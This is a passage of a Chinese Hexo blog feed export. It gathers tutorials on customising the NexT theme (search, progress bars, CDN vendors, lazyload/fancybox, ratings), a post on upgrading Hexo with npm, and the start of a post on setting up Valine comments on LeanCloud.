<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h2 id="代码块样式修改"><a href="#代码块样式修改" class="headerlink" title="代码块样式修改"></a>代码块样式修改</h2><p>在主题配置<code>theme_config</code>下添加：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="comment"># Code Highlight theme</span></span><br><span class="line">  <span class="comment"># Available values: normal | night | night eighties | night blue | night bright | solarized | solarized dark | galactic</span></span><br><span class="line">  <span class="comment"># See: https://github.com/chriskempson/tomorrow-theme</span></span><br><span class="line">  <span class="attr">highlight_theme:</span> <span class="string">solarized</span> <span class="string">dark</span></span><br><span class="line">  <span class="comment"># Add copy button on codeblock</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Show text copy result.</span></span><br><span class="line">    <span class="attr">show_result:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Available values: default | flat | mac</span></span><br><span class="line">    <span class="attr">style:</span> <span class="string">mac</span></span><br></pre></td></tr></table></figure>

<p>本来的注释中就已经有了比较详细的说明，所以就不多做介绍了。根据自己的需要设置即可。</p>
<p><img data-src="codeblock.png" alt="代码块效果图"></p>
<h2 id="文章页面阅读进度显示"><a href="#文章页面阅读进度显示" class="headerlink" title="文章页面阅读进度显示"></a>文章页面阅读进度显示</h2><h4 id="返回页面顶部按钮"><a href="#返回页面顶部按钮" class="headerlink" title="返回页面顶部按钮"></a>返回页面顶部按钮</h4><p>在主题配置<code>theme_config</code>下添加：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">back2top:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>启用后，可以在页面右下角显示一个返回页面顶部的小按钮。如果<code>scrollpercent</code>设置为<code>true</code>，则在这个按钮中会显示页面的阅读进度数值。</p>
<p><img data-src="back2top.png" alt="back2top效果图"></p>
<p>而<code>sidebar</code>设置为<code>true</code>时，该按钮将与侧边栏结合到一起：</p>
<p><img data-src="back2top_sidebar.png" alt="back2top侧边栏效果图"></p>
<h4 id="页面顶部进度条"><a href="#页面顶部进度条" class="headerlink" title="页面顶部进度条"></a>页面顶部进度条</h4><p>在主题配置中直接找到<code>reading_progress</code>。将其添加到站点配置文件<code>_config.yml</code>中的<code>theme_confg</code>下。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reading progress bar</span></span><br><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Available values: top | bottom</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#37c6c0&quot;</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">3px</span></span><br></pre></td></tr></table></figure>
<p>但是，尝试一次以后发现并没有产生效果。后来，经过搜索发现，该功能同样依赖<code>theme-next-reading-progress</code>拓展来实现。由于默认配置文件中的注释里没有提到，所以我一开始完全没意识到需要安装。  </p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd themes/<span class="keyword">next</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>theme-<span class="keyword">next</span>-reading-progress source<span class="regexp">/lib/</span>reading_progress</span><br></pre></td></tr></table></figure>
<p>通过上述命令完成安装即可。</p>
<h2 id="开启文章页面加载进度条"><a href="#开启文章页面加载进度条" class="headerlink" title="开启文章页面加载进度条"></a>开启文章页面加载进度条</h2><blockquote>
<p>2021.09.02 更新： Theme-Next在版本8.7.1的更新中将该插件引入作为默认的进度条插件</p>
</blockquote>
<p>与阅读进度条类似，首先安装拓展<code>theme-next-pace</code>：  </p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd themes/<span class="keyword">next</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>theme-<span class="keyword">next</span>-pace source<span class="regexp">/lib/</span>pace</span><br></pre></td></tr></table></figure>
<p>安装完成后，在主题配置<code>theme_config</code>下添加配置：  </p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"># Progress bar <span class="built_in">in</span> the <span class="built_in">top</span> during page loading.</span><br><span class="line"># <span class="keyword">Dependencies</span>: https://github.com/theme-next/theme-next-pace</span><br><span class="line"># For more information: https://github.com/HubSpot/pace</span><br><span class="line">pace:</span><br><span class="line">  enable: true</span><br><span class="line">  # Themes list:</span><br><span class="line">  # big-counter | <span class="type">bounce</span> | <span class="type">barber</span>-shop | <span class="type">center</span>-atom | <span class="type">center</span>-circle | <span class="type">center</span>-radar | <span class="type">center</span>-<span class="built_in">simple</span></span><br><span class="line">  # corner-indicator | <span class="type">fill</span>-<span class="built_in">left</span> | <span class="type">flat</span>-<span class="built_in">top</span> | <span class="type">flash</span> | <span class="type">loading</span>-bar | <span class="type">mac</span>-osx | <span class="type">material</span> | <span class="type">minimal</span></span><br><span class="line">  theme: center-radar</span><br></pre></td></tr></table></figure>
<p>主题<code>theme:</code>可以设置为自己喜欢的样式，这里我设置为了 <em>center-radar</em> 的样式。在这个<a href="https://github.hubspot.com/pace/docs/welcome/">页面</a>可以看到所有样式的demo。 </p>
<blockquote>
<p>顺带提一下，当前版本的NexT没有办法在配置文件中直接修改该组件的颜色，如果你觉得组件的颜色与自己的博客无法搭配，那么可以进入到<code>themes/next/source/lib/pace/pace-theme-[你要用的主题].min.css</code>，找到 <code>border-color:#29d</code> 将RGB变量修改为你需要的颜色。</p>
</blockquote>
<h2 id="站点首页不显示文章全文"><a href="#站点首页不显示文章全文" class="headerlink" title="站点首页不显示文章全文"></a>站点首页不显示文章全文</h2><p>其实，最佳的方法是在文章中间加入<code>&lt;!-- more --&gt;</code>来精确控制文章的摘要预览。<br>同时，NexT还提供了 <strong>Auto Excerpt</strong> 的功能来实现对文章的自动截取。<br>在主题的配置文件中可以找到<code>excerpt_description: true</code>。这项在当前版本是默认开启的。所以我们不需要进行额外配置。  </p>
<h2 id="启用评论模块"><a href="#启用评论模块" class="headerlink" title="启用评论模块"></a>启用评论模块</h2><p>详见<a href="https://upwnothing.github.io/zh-CN/c0899d18/">为Hexo NexT 添加评论系统</a></p>
<h2 id="开启赞赏功能"><a href="#开启赞赏功能" class="headerlink" title="开启赞赏功能"></a>开启赞赏功能</h2><p> NexT 主题还内置了打赏的功能。首先在<code>theme_config</code>下，添加  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reward (Donate)</span></span><br><span class="line"><span class="comment"># Front-matter variable (unsupport animation).</span></span><br><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="comment"># If true, reward will be displayed in every article by default.</span></span><br><span class="line">  <span class="comment"># 设置为True, 那么打赏按钮会默认显示在每篇文章的底部</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">true</span>  <span class="comment"># 开启动画效果</span></span><br><span class="line">  <span class="comment"># comment: #加入显示的打赏用语 </span></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.png</span> <span class="comment">#微信支付 </span></span><br><span class="line">  <span class="attr">alipay:</span> <span class="string">/images/alipay.png</span>  <span class="comment">#支付宝</span></span><br><span class="line">  <span class="comment"># bitcoin: /images/bitcoin.png  #比特比</span></span><br></pre></td></tr></table></figure>

<p>然后将微信支付，支付宝的收款二维码图片保存为上述的路径。重新生成后就可以在文章底部看到打赏的按钮了。</p>
<h2 id="启用Lazyload图片懒加载"><a href="#启用Lazyload图片懒加载" class="headerlink" title="启用Lazyload图片懒加载"></a>启用Lazyload图片懒加载</h2><p>首先在主题配置文件中，配置  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">lazyload:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>并添加本地js第三方库：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd themes/<span class="keyword">next</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>theme-<span class="keyword">next</span>-jquery-lazyload source<span class="regexp">/lib/</span>jquery_lazyload</span><br></pre></td></tr></table></figure>

<p>或者，也可以直接在主题配置中启用第三方CDN</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vendors:</span><br><span class="line">  lazyload: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>lozad@<span class="number">1</span><span class="regexp">/dist/</span>lozad.min.js</span><br></pre></td></tr></table></figure>

<p>在<code>hexo cl &amp;&amp; hexo g</code>之后，进入自己的网页，随意对任一图片进行”审查元素”. </p>
<p>如果你的<code>img</code>元素中包含<code>data-loaded=&quot;true&quot;</code>,那就说明Lazyload已经生效。</p>
<p><img data-src="lazyload.png" alt="Lazyload效果"></p>
<h2 id="启用Fancybox图片效果"><a href="#启用Fancybox图片效果" class="headerlink" title="启用Fancybox图片效果"></a>启用Fancybox图片效果</h2><p>首先在主题配置文件中，配置  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>并添加本地js第三方库(Fancybox2 或 Fancybox3 任选一个)：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd themes/<span class="keyword">next</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>theme-<span class="keyword">next</span>-fancybox3 source<span class="regexp">/lib/</span>fancybox   <span class="comment"># install Fancybox 3.x</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>theme-<span class="keyword">next</span>-fancybox source<span class="regexp">/lib/</span>fancybox    <span class="comment"># install Fancybox 2.x</span></span><br></pre></td></tr></table></figure>

<p>或者，也可以直接在主题配置中启用第三方CDN (同样根据自己的需要选择版本)</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vendors:</span><br><span class="line">  <span class="comment"># FancyBox</span></span><br><span class="line">  jquery: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>jquery@<span class="number">3</span><span class="regexp">/dist/</span>jquery.min.js</span><br><span class="line">  fancybox: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>fancyapps<span class="regexp">/fancybox@3/</span>dist/jquery.fancybox.min.js</span><br><span class="line">  fancybox_css: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>fancyapps<span class="regexp">/fancybox@3/</span>dist/jquery.fancybox.min.css</span><br><span class="line">  <span class="comment"># jquery: //cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js</span></span><br><span class="line">  <span class="comment"># fancybox: //cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.js</span></span><br><span class="line">  <span class="comment"># fancybox_css: //cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css</span></span><br></pre></td></tr></table></figure>

<p>在<code>hexo cl &amp;&amp; hexo g</code>之后，进入自己的网页，就可以看到网页上的图片都可以点开放大浏览了。 </p>
<p><img data-src="fancybox.png" alt="Fancybox3效果"></p>
<h2 id="配置第三方CDN"><a href="#配置第三方CDN" class="headerlink" title="配置第三方CDN"></a>配置第三方CDN</h2><p>对于这一部分的内容，其实前面在插件介绍中也已经有所涉及了。NexT提供了CDN配置的功能，如果你对某个插件进行了CDN的配置，那么页面在加载时，将会从CDN来下载相关的js脚本。如果配置为空，则会在本地目录读取对应的文件。<br>在加载页面时，可以在Chrome中按F12进入开发者菜单，点击<code>Network</code>标签，可以看到页面在加载时，哪些文件耗费了比较长的时间。如果启用了一些比较大的插件，如<code>Busuanzi</code>，<code>Valine</code>,那么使用CDN来加载静态文件，可以有效地加速页面的加载速度。</p>
<p>在主题配置文件<code>themes/next/_config.yml</code>中，搜索<code>vendors:</code>即可找到第三方CDN的配置项。</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">vendors</span><span class="punctuation">:</span></span><br><span class="line">  <span class="comment"># Internal path prefix.</span></span><br><span class="line">  <span class="attribute">\_internal</span><span class="punctuation">:</span> <span class="string">lib</span></span><br></pre></td></tr></table></figure>

<p>这里定义了如果某插件的CDN没有进行配置，那么就会在<code>themes/next/source/lib/</code>目录下，加载插件所需的静态文件。</p>
<p>然后根据自己启用插件的情况，将需要的行添加到主题配置<code>themes_config</code>下。这里贴出我启用的配置，仅供参考：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vendors:</span><br><span class="line">  fontawesome: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>font-awesome@<span class="number">4</span><span class="regexp">/css/</span>font-awesome.min.css</span><br><span class="line">  jquery: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>jquery@<span class="number">3</span><span class="regexp">/dist/</span>jquery.min.js</span><br><span class="line">  fancybox: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>fancyapps<span class="regexp">/fancybox@3/</span>dist/jquery.fancybox.min.js</span><br><span class="line">  fancybox_css: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>fancyapps<span class="regexp">/fancybox@3/</span>dist/jquery.fancybox.min.css</span><br><span class="line">  lazyload: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>lozad@<span class="number">1</span><span class="regexp">/dist/</span>lozad.min.js</span><br><span class="line">  valine: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>valine@<span class="number">1</span><span class="regexp">/dist/</span>Valine.min.js</span><br><span class="line">  pace: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>pace-js@<span class="number">1</span>/pace.min.js</span><br><span class="line">  pace_css: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>pace-js@<span class="number">1</span><span class="regexp">/themes/</span>blue/pace-theme-minimal.css</span><br><span class="line">  canvas_nest: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>theme-<span class="keyword">next</span><span class="regexp">/theme-next-canvas-nest@1/</span>canvas-nest.min.js</span><br><span class="line">  canvas_nest_nomobile: <span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>theme-<span class="keyword">next</span><span class="regexp">/theme-next-canvas-nest@1/</span>canvas-nest-nomobile.min.js</span><br></pre></td></tr></table></figure>

<h2 id="添加文章评分功能"><a href="#添加文章评分功能" class="headerlink" title="添加文章评分功能"></a>添加文章评分功能</h2><p>在主题配置文件<code>themes/next/_config.yml</code>中搜索<code>rating</code>，找到相关的配置。将其添加到主题配置<code>theme_config</code>下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Star rating support to each article.</span></span><br><span class="line"><span class="comment"># To get your ID visit https://widgetpack.com</span></span><br><span class="line"><span class="attr">rating:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">id:</span>     <span class="comment"># &lt;app_id&gt;</span></span><br><span class="line">  <span class="attr">color:</span>  <span class="string">fc6423</span></span><br></pre></td></tr></table></figure>

<p>根据注释说明打开<a href="https://widgetpack.com/">https://widgetpack.com</a> ,首页点击”Rating”，然后点击页面中间红色的”Get it Free”。页面会跳转到注册页面，注册帐号。  </p>
<p>点开左上角菜单，选择 Rating -&gt; Setting ，可以把 <code>Vote via</code> 修改成 Device或是IP address。这样用户无需登录就可以打分。</p>
<p>菜单中 Site -&gt; Setting ，可以将Private勾上。</p>
<h1 id="NexT内置主题样式美化"><a href="#NexT内置主题样式美化" class="headerlink" title="NexT内置主题样式美化"></a>NexT内置主题样式美化</h1><p>这一部分其实主要是对样式进行自定义修改，基本思路就是在自定义的样式文件中加入对应元素的css属性设置。</p>
<h2 id="侧边栏圆角"><a href="#侧边栏圆角" class="headerlink" title="侧边栏圆角"></a>侧边栏圆角</h2><p>打开<code>themes/next/source/css/_variables/Gemini.styl</code>，根据启用的不同主题，选择相应的文件。这里修改的是<code>Gemini.styl</code>。<br>在文件中修改代码：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$border</span>-radius-inner   = 0 0 10px 10px;</span></span><br><span class="line"><span class="meta"><span class="keyword">$border</span>-radius         = 10px;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>参考文档：</p>
<ul>
<li><a href="https://io-oi.me/tech/hexo-next-optimization">https://io-oi.me/tech/hexo-next-optimization</a></li>
<li><a href="https://gis90.github.io/articles/3412/">https://gis90.github.io/articles/3412/</a></li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Hexo NexT中Fancybox与Lazyload冲突的问题</title>
    <url>/zh-CN/be16ea65/</url>
    <content><![CDATA[<span id="more"></span>


<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>Hexo v4.2.0</li>
<li>NexT v7.7.0</li>
<li>Fancybox v3.5.7</li>
<li>Hexo-Lazyload-image v1.0.5</li>
</ul>
<!-- more -->

<h1 id="问题产生的原因"><a href="#问题产生的原因" class="headerlink" title="问题产生的原因"></a>问题产生的原因</h1><p><a href="https://hexiongbiao.cn/fancyboxandlazyload/">这篇文章</a>解释地非常清楚了。</p>
<p>因为图片懒加载预先会使用占位图来替代图片的<code>src</code>，等图片加载完成后，再用<code>data-original</code>里面的内容替换<code>src</code>里面的内容。然而 <strong>fancybox</strong> 的原理是在页面加载时给页面中所有的图片套一层<code>a标签</code>，<code>a标签</code>的<code>href</code>就是 <strong>fancybox</strong> 在页面加载时获取的图片<code>src</code>，恰好这时候获取的<code>src</code>偏偏就是 <strong>lazyload</strong> 的占位图的 url。</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>在上面提及的博客中，作者提出了一种使用js脚本，在图片完成加载后，对<code>a标签</code>中的<code>href</code>进行修正的方法。但是，我觉得这种方法不利于之后的升级维护，所以没有采用。  </p>
<p>这里，我使用了另一种方法来解决了冲突的问题：更换Lazyload的实现方式。</p>
<p>NexT主题集成了使用<code>lozad.js</code>来实现Lazyload懒加载。使用这个方法则不会与Fancybox产生冲突。具体配置方法，详见<a href="https://upwnothing.github.io/zh-CN/44bf8def/#%E5%90%AF%E7%94%A8Lazyload%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD">在NexT中启用Lazyload</a>。<code>lozad.js</code>使用<code>img</code>标签的<code>data-src</code>属性来保存目标图片的路径。在Lazyload加载前，<code>img</code>标签中并不包含<code>src</code>属性，而Fancybox也能正确从<code>data-src</code>中获取到图片的正确路径。</p>
<h1 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h1><p>前面说了，使用这种方法可以实现Lazyload的功能，但该NexT中集成<code>lozad.js</code>没有提供设置占位图片的选项。所以，如果你一定希望有占位图片，那么这种方法可能并不能满足你的需求。<br>不过，我有一个想法，如果把<code>Hexo-Lazyload-image</code>插件中的<code>data-original</code>属性改成<code>data-src</code>属性，那么能不能实现与Fancybox的兼容呢？我暂时没有进行尝试，只是一个猜想而已。之后有机会的话会尝试一下，再来更新。</p>
<hr>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ul>
<li><a href="http://hexiongbiao.cn/fancyboxandlazyload/">http://hexiongbiao.cn/fancyboxandlazyload/</a></li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>Lazyload</tag>
        <tag>Fancybox</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo版本升级指南</title>
    <url>/zh-CN/3ba3be9/</url>
    <content><![CDATA[<h1 id="2021-4-更新"><a href="#2021-4-更新" class="headerlink" title="2021.4 更新"></a>2021.4 更新</h1><p>今天尝试升级npm，结果遇到了一系列问题。</p>
<p>花了不少时间，最后看到一个简单实用的命令来完成nodejs的升级(nvm方法):</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">nvm install <span class="keyword">stable</span> <span class="comment">--reinstall-packages-from=current</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="2020-11-更新"><a href="#2020-11-更新" class="headerlink" title="2020.11 更新"></a>2020.11 更新</h1><p>最近发现hexo升级到了5.2版本。实测以下方法依旧有效。</p>
<hr>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>进来想起来自己还有这么一个博客。那么第一件事当然是对版本进行升级咯！可升级的过程远远没有想象中的那般顺利，因此在此记录一下，其他人如果遇到类似的问题，也可以有一个借鉴。<br>升级前，先检查当前hexo的版本号：<code>hexo --version</code>。版本信息如下图所示：<br><img data-src="hexo_check_version.png" alt="Hexo版本信息"> </p>
<h1 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h1><p> 在Hexo的文档中搜索一番，结果！！完全没有提及版本升级的方法。。。行吧，只能借助万能的Google，经过比较，终于找到了一个简单粗暴的方法：<br>首先进入Hexo的主目录，然后直接执行</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> update</span><br></pre></td></tr></table></figure>

<p>等等等…没动静呐！看来有必要重新配置一下NPM…</p>
<span id="more"></span>

<h2 id="更换NPM镜像服务器地址，解决国内NPM安装依赖速度慢的问题"><a href="#更换NPM镜像服务器地址，解决国内NPM安装依赖速度慢的问题" class="headerlink" title="更换NPM镜像服务器地址，解决国内NPM安装依赖速度慢的问题"></a>更换NPM镜像服务器地址，解决国内NPM安装依赖速度慢的问题</h2><p>在npm的命令最后使用<code>--registry</code>参数指定国内镜像服务器地址，就可以让NPM的安装速度获得显著的提升。<br>这里我们使用阿里巴巴的镜像：</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">update</span> --<span class="keyword">registry</span>=<span class="keyword">http</span>://<span class="keyword">registry</span>.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p>当然，也可以通过如下的命令对NPM进行永久配置：</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">npm config <span class="keyword">set</span> <span class="keyword">registry</span> <span class="keyword">http</span>://<span class="keyword">registry</span>.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p>这样子，我们的NPM命令就可以快速地执行了！</p>
<h2 id="使用NPM进行Hexo版本升级"><a href="#使用NPM进行Hexo版本升级" class="headerlink" title="使用NPM进行Hexo版本升级"></a>使用NPM进行Hexo版本升级</h2><p>这就完了？？？是的！再执行一遍<code>hexo --version</code>,看一下是不是已经到了最新的版本：<br><img data-src="hexo_check_version_2.png" alt="Hexo版本信息2"></p>
<p>Hmmmmm…版本信息确实产生了变化，从3.7.1升级到了3.9.0。但是，这貌似也不是<a href="http://www.npmjs.com/package/hexo?activeTab=versions">最新的版本</a>呀！！  </p>
<p>难道是Node.js的版本问题？<a href="https://hexo.io/docs/#installation">Hexo官方文档</a>中有Node.js的版本要求，Hexo 4.1+ 需要至少8.10版本。</p>
<p><img data-src="hexo_nodejs_requirement.png" alt="NodeJS版本要求"></p>
<p>我重新看了一下之前<code>hexo --version</code>的输出结果：<code>node: 13.5.0</code>..<br>这个显然是满足的呀！所以完全不会是Node.js的版本问题造成无法更新到最新版本。</p>
<h2 id="Package-json-修改版本信息"><a href="#Package-json-修改版本信息" class="headerlink" title="Package.json 修改版本信息"></a>Package.json 修改版本信息</h2><p>那么，究竟是哪里出了问题呢？<br>仔细思考：NPM是如何管理本地安装的呢？ <strong>package.json</strong>!! 赶紧查看Hexo目录下的<code>package.json</code>文件。果然！我清清楚楚地看到了<code>&quot;hexo&quot; : &quot;^3.9.0&quot;</code>的字样。问题是找到了，但是这一整列的插件，我们如果一个个去查最新的版本，肯定是要费不少功夫，那么有没有更快速的方法呢？<br>我们可以用下列命令来自动化完成这项工作：</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> install -g <span class="built_in">npm</span>-check</span><br><span class="line"><span class="built_in">npm</span> install -g <span class="built_in">npm</span>-upgrade</span><br><span class="line"><span class="built_in">npm</span>-check</span><br><span class="line"><span class="built_in">npm</span>-upgrade</span><br></pre></td></tr></table></figure>

<p>执行结果如下图：<br><img data-src="npm_upgrade.png" alt="npm-upgrade执行结果"></p>
<p>至此，我们完成了<code>package.json</code>中，版本信息的更新。</p>
<h2 id="完成Hexo版本升级"><a href="#完成Hexo版本升级" class="headerlink" title="完成Hexo版本升级"></a>完成Hexo版本升级</h2><p>我们再次执行<code>npm update</code>。<br>完成以后，我们再次通过<code>hexo version</code>确认版本号。成功，我们终于顺利将Hexo升级到了最新的版本。<br><img data-src="hexo_check_version_3.png" alt="Hexo版本信息3"></p>
<hr>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ul>
<li><a href="https://jianshu.com/p/5adcee63c3b8">https://jianshu.com/p/5adcee63c3b8</a></li>
<li><a href="https://hexo.io/docs/">https://hexo.io/docs/</a></li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Configuration</tag>
        <tag>NPM</tag>
      </tags>
  </entry>
  <entry>
    <title>为Hexo NexT 添加评论系统</title>
    <url>/zh-CN/c0899d18/</url>
    <content><![CDATA[<h1 id="2021-1-更新"><a href="#2021-1-更新" class="headerlink" title="2021.1 更新"></a>2021.1 更新</h1><p>由于从Next v8.1.0起，Next的开发者考虑到Valine的隐私泄漏问题以及绑定的百度统计代码，所以Valine被默认移除。这里也推荐更换其他的评论系统。</p>
<p>详细信息可以参考： <a href="https://github.com/next-theme/hexo-theme-next/issues/4">https://github.com/next-theme/hexo-theme-next/issues/4</a> </p>
<hr>
<h1 id="选择合适的评论系统"><a href="#选择合适的评论系统" class="headerlink" title="选择合适的评论系统"></a>选择合适的评论系统</h1><p>我选择评论系统时，考虑到以下几点：</p>
<ul>
<li>免费 ( 排除 <strong>hypercomments</strong> )</li>
<li>无需翻墙 ( 排除 <strong>disqus</strong> )</li>
<li>评论无需注册登录 ( 排除 <strong>gitment</strong>, <strong>gitalk</strong>, <strong>gitter</strong> 这三个github相关的评论系统 )</li>
<li>不要求网站备案 ( 排除一系列国内的评论系统 )</li>
</ul>
<p>在剩下的为数不多的可选项中，<a href="https://valine.js.org/">Valine</a>就成为了那个被我最终选择的评论系统。</p>
<p><strong>最终效果图:</strong><br><img data-src="result.PNG" alt="效果图"></p>
<span id="more"></span>

<h1 id="LeanCloud-注册及配置"><a href="#LeanCloud-注册及配置" class="headerlink" title="LeanCloud 注册及配置"></a><a href="https://www.leancloud.cn/">LeanCloud</a> 注册及配置</h1><h2 id="账号注册"><a href="#账号注册" class="headerlink" title="账号注册"></a>账号注册</h2><p><strong>Valine</strong>是一款基于<strong>LeanCloud</strong>的快速、简洁且高效的无后端评论系统。所以我们需要先注册一个账号。  </p>
<p>这里顺带提一句，在Valine上注册需要手机号码接受验证码，以及通过实名身份认证。</p>
<p><img data-src="Valine_register.PNG" alt="Valine_register"></p>
<p>Valine已经计划在未来支持基于Firebase的评论存储。Firebase可以避免实名身份认证等问题。</p>
<h2 id="创建应用并获取APP-ID-和-APP-Key"><a href="#创建应用并获取APP-ID-和-APP-Key" class="headerlink" title="创建应用并获取APP ID 和 APP Key"></a>创建应用并获取APP ID 和 APP Key</h2><p>在完成上述认证步骤之后，我们可以开始创建应用。  </p>
<p><img data-src="LeanCloud_Create.jpg" alt="创建应用">  </p>
<p>应用创建好以后，进入刚刚创建的应用，选择左下角的设置&gt;应用Key，然后就能看到你的APP ID和APP Key了：</p>
<p><img data-src="LeanCloud_AppKey.jpg" alt="获取App ID和Key"></p>
<p>之后再在左边栏点击储存，查看结构化数据中有没有<em>Comment</em>和<em>Counter</em>这两个Classes。如果没有，点击创建Class，默认选项即可直接创建。</p>
<p><img data-src="LeanCloud_AddClass.PNG" alt="LeanCloud_AddClass"></p>
<p>再进入设置-安全中心，设置自己的安全域名：</p>
<p><img data-src="LeanCloud_SecuredDomain.PNG" alt="LeanCloud_SecuredDomain"></p>
<p>至此，就是全部需要在LeanCloud中进行的操作了。</p>
